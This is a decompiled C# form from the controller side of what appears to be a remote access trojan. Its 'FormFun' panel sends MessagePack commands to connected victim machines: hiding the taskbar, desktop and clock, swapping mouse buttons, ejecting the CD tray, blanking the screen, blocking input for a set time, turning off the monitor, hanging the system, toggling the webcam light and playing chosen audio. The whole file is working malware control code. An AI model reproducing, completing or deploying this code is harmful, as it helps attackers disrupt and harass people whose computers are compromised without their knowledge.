using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using DarkUI.Controls;
using DarkUI.Forms;
using Server.Connection;
using Server.MessagePack;

namespace Server.Forms
{
	// Token: 0x0200004F RID: 79
	public partial class FormFun : DarkForm
	{
		// Token: 0x060002F5 RID: 757 RVA: 0x00017718 File Offset: 0x00017718
		public FormFun()
		{
			this.InitializeComponent();
		}

		// Token: 0x17000096 RID: 150
		// (get) Token: 0x060002F6 RID: 758 RVA: 0x00017728 File Offset: 0x00017728
		// (set) Token: 0x060002F7 RID: 759 RVA: 0x00017730 File Offset: 0x00017730
		public global::Form1 F { get; set; }

		// Token: 0x17000097 RID: 151
		// (get) Token: 0x060002F8 RID: 760 RVA: 0x0001773C File Offset: 0x0001773C
		// (set) Token: 0x060002F9 RID: 761 RVA: 0x00017744 File Offset: 0x00017744
		internal Clients Client { get; set; }

		// Token: 0x17000098 RID: 152
		// (get) Token: 0x060002FA RID: 762 RVA: 0x00017750 File Offset: 0x00017750
		// (set) Token: 0x060002FB RID: 763 RVA: 0x00017758 File Offset: 0x00017758
		internal Clients ParentClient { get; set; }

		// Token: 0x060002FC RID: 764 RVA: 0x00017764 File Offset: 0x00017764
		private void Timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				if (!this.ParentClient.TcpClient.Connected || !this.Client.TcpClient.Connected)
				{
					base.Close();
				}
			}
			catch
			{
			}
		}

		// Token: 0x060002FD RID: 765 RVA: 0x000177BC File Offset: 0x000177BC
		private void button1_Click(object sender, EventArgs e)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "Taskbar+";
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
		}

		// Token: 0x060002FE RID: 766 RVA: 0x00017808 File Offset: 0x00017808
		private void button2_Click(object sender, EventArgs e)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "Taskbar-";
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
		}

		// Token: 0x060002FF RID: 767 RVA: 0x00017854 File Offset: 0x00017854
		private void button3_Click(object sender, EventArgs e)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "Desktop+";
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
		}

		// Token: 0x06000300 RID: 768 RVA: 0x000178A0 File Offset: 0x000178A0
		private void button4_Click(object sender, EventArgs e)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "Desktop-";
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
		}

		// Token: 0x06000301 RID: 769 RVA: 0x000178EC File Offset: 0x000178EC
		private void button5_Click(object sender, EventArgs e)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "Clock+";
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
		}

		// Token: 0x06000302 RID: 770 RVA: 0x00017938 File Offset: 0x00017938
		private void button6_Click(object sender, EventArgs e)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "Clock-";
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
		}

		// Token: 0x06000303 RID: 771 RVA: 0x00017984 File Offset: 0x00017984
		private void button8_Click(object sender, EventArgs e)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "swapMouseButtons";
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
		}

		// Token: 0x06000304 RID: 772 RVA: 0x000179D0 File Offset: 0x000179D0
		private void button7_Click(object sender, EventArgs e)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "restoreMouseButtons";
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
		}

		// Token: 0x06000305 RID: 773 RVA: 0x00017A1C File Offset: 0x00017A1C
		private void button10_Click(object sender, EventArgs e)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "openCD+";
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
		}

		// Token: 0x06000306 RID: 774 RVA: 0x00017A68 File Offset: 0x00017A68
		private void button9_Click(object sender, EventArgs e)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "openCD-";
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
		}

		// Token: 0x06000307 RID: 775 RVA: 0x00017AB4 File Offset: 0x00017AB4
		private void button18_Click(object sender, EventArgs e)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "blankscreen+";
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
		}

		// Token: 0x06000308 RID: 776 RVA: 0x00017B00 File Offset: 0x00017B00
		private void button17_Click(object sender, EventArgs e)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "blankscreen-";
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
		}

		// Token: 0x06000309 RID: 777 RVA: 0x00017B4C File Offset: 0x00017B4C
		private void button11_Click(object sender, EventArgs e)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "blockInput";
			msgPack.ForcePathObject("Time").AsString = this.numericUpDown1.Value.ToString();
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
		}

		// Token: 0x0600030A RID: 778 RVA: 0x00017BB8 File Offset: 0x00017BB8
		private void button15_Click(object sender, EventArgs e)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "holdMouse";
			msgPack.ForcePathObject("Time").AsString = this.numericUpDown2.Value.ToString();
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
		}

		// Token: 0x0600030B RID: 779 RVA: 0x00017C24 File Offset: 0x00017C24
		private void button12_Click(object sender, EventArgs e)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "monitorOff";
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
		}

		// Token: 0x0600030C RID: 780 RVA: 0x00017C70 File Offset: 0x00017C70
		private void button14_Click(object sender, EventArgs e)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "hangSystem";
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
		}

		// Token: 0x0600030D RID: 781 RVA: 0x00017CBC File Offset: 0x00017CBC
		private void button13_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600030E RID: 782 RVA: 0x00017CC0 File Offset: 0x00017CC0
		private void FormFun_FormClosed(object sender, FormClosedEventArgs e)
		{
			ThreadPool.QueueUserWorkItem(delegate(object o)
			{
				Clients client = this.Client;
				if (client == null)
				{
					return;
				}
				client.Disconnected();
			});
		}

		// Token: 0x0600030F RID: 783 RVA: 0x00017CD4 File Offset: 0x00017CD4
		private void button19_Click(object sender, EventArgs e)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "webcamlight+";
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
		}

		// Token: 0x06000310 RID: 784 RVA: 0x00017D20 File Offset: 0x00017D20
		private void button16_Click(object sender, EventArgs e)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "webcamlight-";
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
		}

		// Token: 0x06000311 RID: 785 RVA: 0x00017D6C File Offset: 0x00017D6C
		private void button13_Click_1(object sender, EventArgs e)
		{
			using (OpenFileDialog openFileDialog = new OpenFileDialog())
			{
				openFileDialog.Filter = "(*.wav)|*.wav";
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					byte[] asBytes = File.ReadAllBytes(openFileDialog.FileName);
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "playAudio";
					msgPack.ForcePathObject("wavfile").SetAsBytes(asBytes);
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				}
				else
				{
					MessageBox.Show("Please choose a wav file.");
				}
			}
		}
	}
}
